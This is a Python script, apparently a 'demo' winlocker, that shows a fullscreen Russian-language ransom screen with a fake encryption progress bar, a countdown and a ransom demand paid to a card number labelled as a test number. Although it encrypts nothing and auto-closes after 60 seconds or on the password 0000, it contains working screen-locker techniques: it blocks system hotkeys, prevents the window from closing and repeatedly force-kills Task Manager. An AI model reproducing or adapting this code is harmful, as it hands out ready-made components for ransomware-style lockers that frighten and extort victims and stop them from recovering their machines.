import tkinter as tk
import winsound
import time
import threading
import ctypes
import sys
import os
import subprocess

PASSWORD = "0000"
TIMER_SECONDS = 60

SESSION_ID = "X9F-2K7-4Q3"

MESSAGE = f"""
☠️  ВНИМАНИЕ!  ☠️

Ваш компьютер был заражён вымогателем.
Все ваши файлы (документы, фото, видео, проекты)
зашифрованы алгоритмом AES-256-RSA.

ID сессии: {SESSION_ID}

Для расшифровки необходимо оплатить выкуп:
Сумма: 5000 RUB
Номер карты: 2200 1234 5678 9012 (ТЕСТОВЫЙ)

Срок: 48 часов.
После этого ключ будет уничтожен.

Введите пароль для разблокировки (демо-режим):
"""

# === БЛОКИРОВКА WIN, ALT+TAB, ALT+F4, CTRL+ESC ===
def block_keys():
    try:
        import keyboard
        # Блокируем клавиши
        for key in ['windows', 'left windows', 'right windows']:
            keyboard.block_key(key)
        keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
        keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+esc', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
    except:
        pass

# === УБИЙСТВО ДИСПЕТЧЕРА ЗАДАЧ ===
def kill_task_manager():
    while True:
        try:
            subprocess.run(['taskkill', '/f', '/im', 'Taskmgr.exe'],
                           capture_output=True, shell=True)
        except:
            pass
        time.sleep(0.5)

# === ЗВУК СИРЕНЫ ===
def play_alarm():
    for _ in range(3):
        try:
            winsound.Beep(800, 200)
            winsound.Beep(600, 200)
            winsound.Beep(1000, 300)
            time.sleep(0.1)
        except:
            pass

# === ОСНОВНОЕ ОКНО ===
def main():
    root = tk.Tk()
    root.title("💀 RANSOMWARE • ДЕМО")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.config(bg='black')
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # блокируем закрытие

    # Мигающий фон
    def blink():
        current = root.cget("bg")
        next_color = "red" if current == "black" else "black"
        root.config(bg=next_color)
        root.after(500, blink)
    blink()

    frame = tk.Frame(root, bg='black')
    frame.pack(expand=True)

    # Текст
    msg = tk.Label(frame, text=MESSAGE, font=("Courier New", 16, "bold"),
                   fg="white", bg="black", justify="left")
    msg.pack(pady=10)

    # Прогресс
    progress_label = tk.Label(frame, text="Шифрование файлов: 0%", font=("Arial", 14),
                              fg="orange", bg="black")
    progress_label.pack(pady=5)

    def update_progress():
        for i in range(0, 101, 5):
            progress_label.config(text=f"Шифрование файлов: {i}%")
            time.sleep(0.08)
        progress_label.config(text="✅ Шифрование завершено", fg="red")
    threading.Thread(target=update_progress, daemon=True).start()

    # Таймер
    timer_label = tk.Label(frame, text="⏳ Осталось: 01:00", font=("Arial", 16),
                           fg="yellow", bg="black")
    timer_label.pack(pady=5)

    def update_timer(remaining):
        if remaining <= 0:
            timer_label.config(text="⏳ Время вышло! Ключ уничтожен.", fg="red")
            return
        mins = remaining // 60
        secs = remaining % 60
        timer_label.config(text=f"⏳ Осталось: {mins:02d}:{secs:02d}")
        root.after(1000, update_timer, remaining-1)
    update_timer(TIMER_SECONDS)

    # Поле ввода
    entry = tk.Entry(frame, font=("Arial", 20), show="*", justify="center",
                     width=20, bg="gray10", fg="lime")
    entry.pack(pady=10)
    entry.focus()

    result = tk.Label(frame, text="", font=("Arial", 16), fg="yellow", bg="black")
    result.pack()

    # Кнопка оплаты
    def pay_window():
        pay_root = tk.Toplevel(root)
        pay_root.title("Оплата выкупа")
        pay_root.geometry("400x300")
        pay_root.config(bg="gray20")
        pay_root.attributes("-topmost", True)
        tk.Label(pay_root, text="Инструкция по оплате (ДЕМО)", font=("Arial", 16),
                 fg="white", bg="gray20").pack(pady=20)
        tk.Label(pay_root, text="Переведите 5000 руб на карту\n2200 1234 5678 9012\n\nЭто тестовый номер.",
                 font=("Arial", 14), fg="white", bg="gray20").pack()
        tk.Button(pay_root, text="Закрыть", command=pay_root.destroy).pack(pady=10)

    def check():
        if entry.get() == PASSWORD:
            result.config(text="✅ Пароль верен! Разблокировка...", fg="lime")
            root.after(500, root.destroy)
            sys.exit(0)
        else:
            result.config(text="❌ Неверный пароль", fg="orange")
            entry.delete(0, tk.END)

    btn_frame = tk.Frame(frame, bg='black')
    btn_frame.pack(pady=5)

    tk.Button(btn_frame, text="🔓 РАЗБЛОКИРОВАТЬ", font=("Arial", 14),
              command=check, bg="gray30", fg="white").pack(side="left", padx=10)

    tk.Button(btn_frame, text="💳 ОПЛАТИТЬ ВЫКУП", font=("Arial", 14),
              command=pay_window, bg="darkred", fg="white").pack(side="left", padx=10)

    # Блокировка Alt+F4 и Escape
    root.bind('<Alt-F4>', lambda e: 'break')
    root.bind('<Escape>', lambda e: 'break')

    # Автозакрытие
    def auto_close(remaining):
        if remaining <= 0:
            root.destroy()
            sys.exit(0)
        root.title(f"⏳ Автозакрытие через {remaining} сек")
        root.after(1000, auto_close, remaining-1)
    root.after(1000, auto_close, TIMER_SECONDS)

    # Звук
    threading.Thread(target=play_alarm, daemon=True).start()

    # Блокировка клавиш
    threading.Thread(target=block_keys, daemon=True).start()

    # Убийство диспетчера задач
    threading.Thread(target=kill_task_manager, daemon=True).start()

    root.mainloop()

if __name__ == "__main__":
    print("💀 ЗАПУСК ВИНЛОКЕРА")
    print("📌 Пароль: 0000")
    print("⏳ Автозакрытие через 60 сек")
    main()
    print("✅ Разблокировано. Вреда нет.")